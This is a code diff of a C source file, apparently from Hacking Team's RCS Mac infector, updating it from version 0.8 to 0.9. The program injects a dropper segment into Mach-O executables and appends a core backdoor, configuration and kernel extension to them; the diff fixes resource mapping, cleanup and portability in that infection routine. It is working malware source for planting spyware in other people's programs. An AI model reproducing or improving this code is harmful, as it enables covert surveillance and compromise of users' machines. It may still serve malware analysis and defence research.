@@ -28,9 +28,8 @@
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
-
 #ifdef __APPLE__
-#include <libc.h>
+#include <unistd.h>
 #endif
 #include <stdio.h>
 #include <stdlib.h>
@@ -43,24 +42,23 @@
 #include <io.h>
 #endif
 
-//#include "RCSMacDropperStruct.h"
 #include "RCSMacCommon.h"
 #include "RCSMacInfector.h"
+#include "RCSMacDropper.h"
 
-
-#define VERSION           0.8
+#define VERSION           0.9
 #define INJECTED_SEGMENT  "__INIT_STUBS"
 
-extern void dropperStart ();
-extern void labelTest ();
-extern void firstStageDropper ();
-extern void secondStageDropper ();
-extern void dropperEnd ();
+//extern void dropperStart ();
+//extern void labelTest ();
+//extern void firstStageDropper ();
+//extern void secondStageDropper ();
+//extern void dropperEnd ();
 
 //static unsigned int paddedPagezeroVASize = 0;
 
-#define ENTRY_POINT				((byte *)secondStageDropper - (byte *)dropperStart)
-#define DROPPER_CODE_SIZE		((byte *)dropperEnd - (byte *)dropperStart)
+#define ENTRY_POINT				    ((byte *)secondStageDropper - (byte *)dropperStart)
+#define DROPPER_CODE_SIZE		  ((byte *)dropperEnd - (byte *)dropperStart)
 #define FIRST_STAGE_CODE_SIZE	((byte *)firstStageDropper - (byte *)labelTest)
 
 
@@ -228,7 +226,7 @@ int appendData (char *inputFilePointer,
   //
   memcpy (outputFilePointer + offset,
           dropperStart,
-          (size_t)DROPPER_CODE_SIZE);
+          (mSize_t)DROPPER_CODE_SIZE);
   
   offset += (int) DROPPER_CODE_SIZE;
   
@@ -277,8 +275,9 @@ int appendData (char *inputFilePointer,
   tempFilePointer = NULL;
 
 #ifdef WIN32
-  if(tempFilePointer != NULL)
+  if (tempFilePointer != NULL)
 	  UnmapViewOfFile(tempFilePointer);
+
   CloseHandle(tempFDMap);
   CloseHandle(tempFD);
 #else
@@ -301,7 +300,7 @@ int appendData (char *inputFilePointer,
   
   offset += sizeof (resourceHeader);
 #ifdef WIN32
-  if ((tempFilePointer = mapFile (coreFileName, &tempFileSize,
+  if ((tempFilePointer = mapFile (confFileName, &tempFileSize,
 								  &tempFD, &tempFDMap, 0)) == NULL)
 
 #else 
@@ -321,6 +320,7 @@ int appendData (char *inputFilePointer,
 #ifdef WIN32
   if(tempFilePointer != NULL)
 	  UnmapViewOfFile(tempFilePointer);
+
   CloseHandle(tempFDMap);
   CloseHandle(tempFD);
 #else
@@ -350,11 +350,11 @@ int appendData (char *inputFilePointer,
       
       offset += sizeof (resourceHeader);
 #ifdef WIN32
-	  if ((tempFilePointer = mapFile (coreFileName, &tempFileSize,
+	  if ((tempFilePointer = mapFile (kextFileName, &tempFileSize,
 									  &tempFD, &tempFDMap, 0)) == NULL)
 
 #else
-      if ((tempFilePointer = mapFile (confFileName, &tempFileSize,
+      if ((tempFilePointer = mapFile (kextFileName, &tempFileSize,
                                       &tempFD, 0)) == NULL)
 #endif
         {
@@ -362,9 +362,18 @@ int appendData (char *inputFilePointer,
           exit (1);
         }
 
-	  memcpy (outputFilePointer + offset,
+      memcpy (outputFilePointer + offset,
               tempFilePointer,
-              gConfFileSize);                
+              gConfFileSize);
+#ifdef WIN32
+      if (tempFilePointer != NULL)
+        UnmapViewOfFile (tempFilePointer);
+
+      CloseHandle (tempFDMap);
+      CloseHandle (tempFD);
+#else
+      close (tempFD);
+#endif
     }
   
   return offset;
@@ -713,13 +722,8 @@ int getFileSize (char *aFilePath)
   return sb.st_size;
 }
 
-#ifdef WIN32
 void
-usage (TCHAR *aBinaryName)
-#else
-void
-usage (char *aBinaryName)
-#endif
+usage (_mChar *aBinaryName)
 {
 #ifdef WIN32
 	printf ("\nUsage: %S <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
@@ -735,34 +739,35 @@ usage (char *aBinaryName)
 }
 
 int
-parseArguments (int argc, TCHAR **argv)
+parseArguments (int argc, _mChar **argv)
 {
 	if (argc != 7)
     {
       return kErrorGeneric;
     }
 
-#ifdef WIN32
-	coreFileName   = (char *) calloc(wcslen(argv[1]), 1);
-	confFileName   = (char *) calloc(wcslen(argv[2]), 1);
-	kextFileName   = (char *) calloc(wcslen(argv[3]), 1);
-	installPath    = (char *) calloc(wcslen(argv[4]), 1);
-	inputFileName  = (char *) calloc(wcslen(argv[5]), 1);
-	outputFileName = (char *) calloc(wcslen(argv[6]), 1);
-	sprintf_s(coreFileName, sizeof(coreFileName), "%S", argv[1]);
-	sprintf_s(confFileName, sizeof(confFileName), "%S", argv[2]);
-	sprintf_s(kextFileName, sizeof(kextFileName), "%S", argv[3]);
-	sprintf_s(installPath, sizeof(installPath), "%S", argv[4]);
-	sprintf_s(inputFileName, sizeof(inputFileName), "%S", argv[5]);
-	sprintf_s(outputFileName, sizeof(outputFileName), "%S", argv[6]);
-#else
+#ifdef WIN32_NO
+  coreFileName   = (char *)calloc(1, strlen(argv[1]) + 1);
+	confFileName   = (char *)calloc(1, strlen(argv[2]) + 1);
+	kextFileName   = (char *)calloc(1, strlen(argv[3]) + 1);
+	installPath    = (char *)calloc(1, strlen(argv[4]) + 1);
+	inputFileName  = (char *)calloc(1, strlen(argv[5]) + 1);
+	outputFileName = (char *)calloc(1, strlen(argv[6]) + 1);
+
+  sprintf_s(coreFileName, sizeof(coreFileName), "%s", argv[1]);
+	sprintf_s(confFileName, sizeof(confFileName), "%s", argv[2]);
+	sprintf_s(kextFileName, sizeof(kextFileName), "%s", argv[3]);
+	sprintf_s(installPath, sizeof(installPath), "%s", argv[4]);
+	sprintf_s(inputFileName, sizeof(inputFileName), "%s", argv[5]);
+	sprintf_s(outputFileName, sizeof(outputFileName), "%s", argv[6]);
+#endif
+
   coreFileName          = argv[1];
   confFileName          = argv[2];
   kextFileName          = argv[3];
   installPath           = argv[4];
   inputFileName         = argv[5];
   outputFileName        = argv[6];
-#endif
 
   return kSuccess;
 }
@@ -770,29 +775,27 @@ parseArguments (int argc, TCHAR **argv)
 #ifdef WIN32
 void freeArguments()
 {
-	if(coreFileName != NULL)
+	if (coreFileName != NULL)
 		free(coreFileName);
-	if(confFileName != NULL)
+	if (confFileName != NULL)
 		free(confFileName);
-	if(kextFileName != NULL)
+	if (kextFileName != NULL)
 		free(kextFileName);
-	if(installPath != NULL)
+	if (installPath != NULL)
 		free(installPath);
-	if(inputFileName != NULL)
+	if (inputFileName != NULL)
 		free(inputFileName);
-	if(outputFileName != NULL)
+	if (outputFileName != NULL)
 		free(outputFileName);
 }	
 #endif
 
-#ifdef WIN32
-int main(int argc, TCHAR* argv[])
-#else
 int
-main (int argc, char **argv)
-#endif
+main (int argc, _mChar *argv[])
 {
-  struct fatArch             *f_arch;
+  printf("sizeofStat Struct: %d\n", sizeof(struct stat));
+
+  struct fat_arch *f_arch;
   char *inputFilePointer      = NULL;
   char *outputFilePointer     = NULL;
   
@@ -800,17 +803,16 @@ main (int argc, char **argv)
   int outputFileSize          = 0;
   int fileType                = 0;
   int padding                 = 0;
-  
+  int i                       = 0;
   gNumStrings                 = 4;
  
 #ifdef WIN32
   HANDLE inputFD, outputFD, inputFDMap, outputFDMap;
-  int i;
 #else
-  int inputFD, outputFD, i;
+  int inputFD, outputFD;
 #endif  
+
   int offsetToResources       = 0;
-  
   unsigned int inputOffset    = 0;
   unsigned int outputOffset   = 0;
   int nfat                    = 0;
@@ -831,7 +833,7 @@ main (int argc, char **argv)
     {
       printf ("[ee] Core backdoor file not found\n");
 #ifdef WIN32
-	  freeArguments();
+      freeArguments();
 #endif
       exit (1);
     }
@@ -840,9 +842,9 @@ main (int argc, char **argv)
     {
       printf ("[ee] Configuration file not found\n");
 #ifdef WIN32
-	  freeArguments();
+      freeArguments();
 #endif
-	  exit (1);
+      exit (1);
     }
   
   if (strncmp ("null", kextFileName, strlen ("null")) != 0)
@@ -851,25 +853,28 @@ main (int argc, char **argv)
         {
           printf ("[ee] KEXT file not found\n");
 #ifdef WIN32
-		  freeArguments();
+          freeArguments();
 #endif
-		  exit (1);
+          exit (1);
         }
     }
   
   // Map input file
 #ifdef WIN32
-  if ((inputFilePointer = mapFile (inputFileName, &inputFileSize,
-								  &inputFD, &inputFDMap, 0)) == NULL)
+  if ((inputFilePointer = mapFile (inputFileName,
+                                   &inputFileSize,
+                                   &inputFD,
+                                   &inputFDMap,
+                                   0)) == NULL)
 
 #else
   if ((inputFilePointer = mapFile (inputFileName, &inputFileSize,
-                                   &inputFD, 0)) == NULL)
+                                   &inputFD, 0, 0)) == NULL)
 #endif
 	{
       printf("[ee] Error while mmapping the input file\n");
 #ifdef WIN32
-	  freeArguments();
+      freeArguments();
 #endif
       exit (1);
     }
@@ -884,6 +889,7 @@ main (int argc, char **argv)
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
                     + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 3 : 2);
+
 #ifdef DEBUG_VERBOSE
   printf ("unpadded outSize: %d\n", outputFileSize);
 #endif
@@ -906,29 +912,30 @@ main (int argc, char **argv)
   
   // Map output file
 #ifdef WIN32
-  if ((outputFilePointer = mapFile (outputFileName, &tempSize,
-								    &outputFD, &outputFDMap, &padding)) == NULL)
-
+  if ((outputFilePointer = mapFile (outputFileName,
+                                    &tempSize,
+                                    &outputFD,
+                                    &outputFDMap,
+                                    &padding)) == NULL)
 #else
   if ((outputFilePointer = mapFile (outputFileName, &tempSize,
-                                    &outputFD, &padding)) == NULL)
+                                    &outputFD, 0, &padding)) == NULL)
 #endif
 	{
-      printf("[ee] Error while mmapping the output file\n");
+    printf("[ee] Error while mmapping the output file\n");
 #ifdef WIN32
-	  freeArguments();
+    freeArguments();
 #endif
-	  exit (1);
-    }
+    exit (1);
+  }
   
   // Giving the output file the correct fileSize
 #ifdef WIN32
   if (SetFilePointer(outputFD, tempSize + padding - 1, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
-  {
-	  freeArguments();
-	  exit (1);
-  }
-	
+    {
+      freeArguments();
+      exit (1);
+    }
 #else
   if (lseek (outputFD, tempSize + padding - 1, SEEK_SET) == kErrorGeneric)
     {
@@ -938,21 +945,22 @@ main (int argc, char **argv)
 
 #ifdef WIN32
   DWORD dwByteW;
-  if ( WriteFile(outputFD, "", 1, &dwByteW, 0) == 0)
-  {
-	  if(inputFilePointer != NULL)
-		  UnmapViewOfFile(inputFilePointer);
-	  if(outputFilePointer != NULL)
-		  UnmapViewOfFile(outputFilePointer);
-	
-	  CloseHandle(outputFDMap);
-	  CloseHandle(inputFDMap);
-	  CloseHandle(outputFD);
-	  CloseHandle(inputFD);
 
-	  freeArguments();
-	  return kErrorWriteFile;
-  }
+  if (WriteFile(outputFD, "", 1, &dwByteW, 0) == 0)
+    {
+      if (inputFilePointer != NULL)
+        UnmapViewOfFile(inputFilePointer);
+      if (outputFilePointer != NULL)
+        UnmapViewOfFile(outputFilePointer);
+      
+      CloseHandle(outputFDMap);
+      CloseHandle(inputFDMap);
+      CloseHandle(outputFD);
+      CloseHandle(inputFD);
+      freeArguments();
+      
+      return kErrorWriteFile;
+    }
 #else
   if (write (outputFD, "", 1) == kErrorGeneric)
     {
@@ -985,7 +993,7 @@ main (int argc, char **argv)
         int x86Found      = 0;
         
         gFileType = 2;
-        nfat = SWAP_LONG (gFatHeader.nfatArch);
+        nfat = SWAP_LONG (gFatHeader.nfat_arch);
         
         printf ("[ii] FAT (swapped) Binary found\n");
         printf ("[ii] Found %d Arch(s)\n", nfat);
@@ -996,8 +1004,8 @@ main (int argc, char **argv)
         
         for (i = 0; i < nfat; i++)
           {
-            f_arch = (fatArch *) allocate (sizeof (struct fatArch));
-            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fatArch));
+            f_arch = (fat_arch *) allocate (sizeof (struct fat_arch));
+            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fat_arch));
             
             cputype       = SWAP_LONG (f_arch->cputype);
             archOffset    = SWAP_LONG (f_arch->offset);
@@ -1042,11 +1050,11 @@ main (int argc, char **argv)
               }
             
             f_arch->size = SWAP_LONG (f_arch->size);
-            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fatArch));
+            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
             
             free (f_arch);
-            inputOffset   += sizeof (struct fatArch);
-            outputOffset  += sizeof (struct fatArch);
+            inputOffset   += sizeof (struct fat_arch);
+            outputOffset  += sizeof (struct fat_arch);
           }
         
         break;
@@ -1093,20 +1101,18 @@ main (int argc, char **argv)
     }
 
   printf ("[ii] File Infected with success\n");
-  
 
-  if(inputFilePointer != NULL)
-	  UnmapViewOfFile(inputFilePointer);
-  if(outputFilePointer != NULL)
-	  UnmapViewOfFile(outputFilePointer);
+#ifdef WIN32
+  if (inputFilePointer != NULL)
+    UnmapViewOfFile(inputFilePointer);
+  if (outputFilePointer != NULL)
+    UnmapViewOfFile(outputFilePointer);
 
   CloseHandle(outputFDMap);
   CloseHandle(inputFDMap);
   CloseHandle(outputFD);
   CloseHandle(inputFD);
-
-#ifdef WIN32
-  freeArguments();
+  //freeArguments();
 #endif
 
   return kSuccess;
